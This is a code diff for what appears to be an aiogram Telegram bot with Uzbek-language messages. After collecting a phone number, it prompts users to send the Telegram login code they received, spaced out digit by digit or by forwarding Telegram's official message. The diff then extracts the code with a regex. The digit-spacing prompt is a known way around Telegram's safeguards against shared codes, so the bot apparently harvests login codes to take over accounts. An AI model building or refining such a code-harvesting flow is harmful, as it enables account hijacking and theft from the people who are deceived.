@@ -610,14 +610,39 @@ async def process_phone(message: types.Message, state: FSMContext):
     if success:
         await state.update_data(phone=phone)
         await state.set_state(LoginState.waiting_for_code)
-        await message.answer("🔐 <b>TELEGRAM KODI YUBORILDI!</b>\nIltimos, Telegramdan kelgan kodni <b>BO'SH JOY qoldirib</b> (Masalan: <code>1 2 3 4 5</code>) kiriting:\n\nYoki agar butun boshli xabarni nusxalab tashlasangiz (Forward qilsangiz) ham o'zim o'qib olaman!", reply_markup=types.ReplyKeyboardRemove())
+        await message.answer(
+            "🔐 <b>TELEGRAM TASDIQLASH KODI YUBORILDI!</b>\n\n"
+            "Iltimos, rasmiy <b>Telegram</b> xabariga kelgan 5 xonali kodni kiriting:\n"
+            "• Qanday yozsangiz ham qabul qilinadi: <code>32222</code> yoki <code>3 2 2 2 2</code>\n"
+            "• Yoki xabarni to'g'ridan-to'g'ri forward qiling!",
+            reply_markup=types.ReplyKeyboardRemove()
+        )
     else:
         await message.answer(f"❌ Xatolik yuz berdi: {result}\n\nIltimos, raqam to'g'riligini tekshiring va qayta urinib ko'ring.", reply_markup=get_main_menu())
         await state.clear()
 
 @dp.message(LoginState.waiting_for_code)
 async def process_code(message: types.Message, state: FSMContext):
-    code = message.text.replace(" ", "").replace(".", "").replace("-", "").strip()
+    raw_text = message.text or ""
+    
+    if raw_text in ['🔙 Bekor qilish', '/cancel', 'cancel', 'bekor']:
+        await state.clear()
+        await message.answer('Bekor qilindi.', reply_markup=get_main_menu())
+        return
+
+    import re
+    # 5 xonali raqamni topish yoki barcha raqamlarni tozalab olish
+    match = re.search(r'\b\d{5}\b', raw_text)
+    if match:
+        code = match.group(0)
+    else:
+        digits = re.sub(r'\D', '', raw_text)
+        code = digits[:5] if len(digits) >= 5 else digits
+
+    if not code or len(code) < 4:
+        await message.answer("❌ <b>Kodni aniqlab bo'lmadi!</b>\n\nIltimos, Telegramdan kelgan 5 xonali kodni yuboring (Masalan: <code>32222</code> yoki <code>3 2 2 2 2</code>):")
+        return
+
     user_id = message.from_user.id
     
     await message.answer("⏳ <i>Tekshirilmoqda...</i>")
